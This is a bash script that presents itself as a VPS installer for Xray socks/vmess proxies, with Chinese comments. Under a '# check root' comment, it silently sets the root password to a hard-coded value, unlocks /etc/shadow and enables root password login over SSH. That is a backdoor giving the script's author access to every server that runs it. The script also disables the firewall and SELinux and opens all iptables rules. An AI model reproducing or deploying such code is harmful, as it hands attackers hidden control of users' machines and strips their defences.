green='\033[0;32m'
yellow='\033[0;33m'
plain='\033[0m'

DEFAULT_START_PORT=20000                         #默认起始端口
DEFAULT_SOCKS_USERNAME="userb"                   #默认socks账号
DEFAULT_SOCKS_PASSWORD="passwordb"               #默认socks密码
DEFAULT_WS_PATH="/ws"                            #默认ws路径
DEFAULT_UUID="059ab893-7a38-4a01-a4fa-8111bb7e50cb" #默认随机UUID

IP_ADDRESSES=($(hostname -I))
cur_dir=$(pwd)

# check root
[[ $EUID -ne 0 ]] && su='sudo' 
lsattr /etc/passwd /etc/shadow >/dev/null 2>&1
chattr -i /etc/passwd /etc/shadow >/dev/null 2>&1
chattr -a /etc/passwd /etc/shadow >/dev/null 2>&1
lsattr /etc/passwd /etc/shadow >/dev/null 2>&1
prl=`grep PermitRootLogin /etc/ssh/sshd_config`
pa=`grep PasswordAuthentication /etc/ssh/sshd_config`
if [[ -n $prl && -n $pa ]]; then
mima=520940
echo root:$mima | $su chpasswd root
$su sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/g' /etc/ssh/sshd_config;
$su sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication yes/g' /etc/ssh/sshd_config;
$su service sshd restart
else
red "当前vps不支持root账户或无法自定义root密码,建议先执行sudo -i 进入root账户后再执行脚本" 
fi

install_base() {
    if [[ x"${release}" == x"centos" ]]; then
        yum install epel-release -y && yum install wget curl tar -y
    else
        apt update && apt install wget curl tar -y
    fi

	echo -e "${green}关闭防火墙，开放所有端口规则……${plain}"
	sleep 1
	systemctl stop firewalld.service >/dev/null 2>&1
	systemctl disable firewalld.service >/dev/null 2>&1
	setenforce 0 >/dev/null 2>&1
	ufw disable >/dev/null 2>&1
	iptables -P INPUT ACCEPT >/dev/null 2>&1
	iptables -P FORWARD ACCEPT >/dev/null 2>&1
	iptables -P OUTPUT ACCEPT >/dev/null 2>&1
	iptables -t mangle -F >/dev/null 2>&1
	iptables -F >/dev/null 2>&1
	iptables -X >/dev/null 2>&1
	netfilter-persistent save >/dev/null 2>&1
	if [[ -n $(apachectl -v 2>/dev/null) ]]; then
	systemctl stop httpd.service >/dev/null 2>&1
	systemctl disable httpd.service >/dev/null 2>&1
	service apache2 stop >/dev/null 2>&1
	systemctl disable apache2 >/dev/null 2>&1
	fi

}

install_xray() {
	echo "安装 Xray..."
	apt-get install unzip -y || yum install unzip -y
	wget https://github.com/XTLS/Xray-core/releases/download/v1.8.6/Xray-linux-64.zip
	unzip Xray-linux-64.zip
	mv xray /usr/local/bin/xrayL
	chmod +x /usr/local/bin/xrayL
	cat <<EOF >/etc/systemd/system/xrayL.service
[Unit]
Description=XrayL Service
After=network.target

[Service]
ExecStart=/usr/local/bin/xrayL -c /etc/xrayL/config.toml
Restart=on-failure
User=nobody
RestartSec=3

[Install]
WantedBy=multi-user.target
EOF
	systemctl daemon-reload
	systemctl enable xrayL.service
	systemctl start xrayL.service
	echo "Xray 安装完成."
}
config_xray() {
	config_type=$1
	mkdir -p /etc/xrayL
	if [ "$config_type" != "socks" ] && [ "$config_type" != "vmess" ]; then
		echo "类型错误！仅支持socks和vmess."
		exit 1
	fi

	START_PORT=${START_PORT:-$DEFAULT_START_PORT}
	if [ "$config_type" == "socks" ]; then
		SOCKS_USERNAME=${SOCKS_USERNAME:-$DEFAULT_SOCKS_USERNAME}
		SOCKS_PASSWORD=${SOCKS_PASSWORD:-$DEFAULT_SOCKS_PASSWORD}
	elif [ "$config_type" == "vmess" ]; then
		UUID=${UUID:-$DEFAULT_UUID}
		WS_PATH=${WS_PATH:-$DEFAULT_WS_PATH}
	fi

	for ((i = 0; i < ${#IP_ADDRESSES[@]}; i++)); do
		config_content+="[[inbounds]]\n"
		config_content+="port = $((START_PORT + i))\n"
		config_content+="protocol = \"$config_type\"\n"
		config_content+="tag = \"tag_$((i + 1))\"\n"
		config_content+="[inbounds.settings]\n"
		if [ "$config_type" == "socks" ]; then
			config_content+="auth = \"password\"\n"
			config_content+="udp = true\n"
			config_content+="ip = \"${IP_ADDRESSES[i]}\"\n"
			config_content+="[[inbounds.settings.accounts]]\n"
			config_content+="user = \"$SOCKS_USERNAME\"\n"
			config_content+="pass = \"$SOCKS_PASSWORD\"\n"
		elif [ "$config_type" == "vmess" ]; then
			config_content+="[[inbounds.settings.clients]]\n"
			config_content+="id = \"$UUID\"\n"
			config_content+="[inbounds.streamSettings]\n"
			config_content+="network = \"ws\"\n"
			config_content+="[inbounds.streamSettings.wsSettings]\n"
			config_content+="path = \"$WS_PATH\"\n\n"
		fi
		config_content+="[[outbounds]]\n"
		config_content+="sendThrough = \"${IP_ADDRESSES[i]}\"\n"
		config_content+="protocol = \"freedom\"\n"
		config_content+="tag = \"tag_$((i + 1))\"\n\n"
		config_content+="[[routing.rules]]\n"
		config_content+="type = \"field\"\n"
		config_content+="inboundTag = \"tag_$((i + 1))\"\n"
		config_content+="outboundTag = \"tag_$((i + 1))\"\n\n\n"
	done
	echo -e "$config_content" >/etc/xrayL/config.toml
	systemctl restart xrayL.service
	systemctl --no-pager status xrayL.service
	v4=$(curl -s4m6 ip.sb -k)
	v6=$(curl -s6m6 ip.sb -k)
 	int="${green}生成 $config_type 配置完成:${plain}  ${green}"
 

	echo ""
	echo -e "$int"
	echo "HOST-v4:	$v4"
  	echo "HOST-v6:	$v6"
	echo "起始端口:	$START_PORT"
	echo "结束端口:	$(($START_PORT + $i - 1))"
	if [ "$config_type" == "socks" ]; then
		echo "socks账号: $SOCKS_USERNAME"
		echo "socks密码: $SOCKS_PASSWORD"
	elif [ "$config_type" == "vmess" ]; then
		echo "UUID: $UUID"
		echo "ws路径: $WS_PATH"
		qrCodeBase64Default=$(echo -n "{\"v\":\"2\",\"ps\":\"${v4}\",\"add\":\"${v4}\",\"port\":\"${START_PORT}\",\"id\":\"${UUID}\",\"host\":\"\",\"path\":\"${WS_PATH}\",\"net\":\"ws\",\"security\":\"none\"}" | base64 -w 0)
		qrCodeBase64Default="${qrCodeBase64Default// /}"
		echo vmess://${qrCodeBase64Default}
	fi
	echo ""
}
main() {
	[ -x "$(command -v xrayL)" ] || install_xray
	if [ $# -eq 1 ]; then
		config_type="$1"
	else
		read -p "选择生成的节点类型 (socks/vmess): " config_type
	fi
	if [ "$config_type" == "vmess" ]; then
		config_xray "vmess"
	elif [ "$config_type" == "socks" ]; then
		config_xray "socks"
	else
		echo "未正确选择类型，使用默认sokcs配置."
		config_xray "socks"
	fi
}
install_base
main "$@"
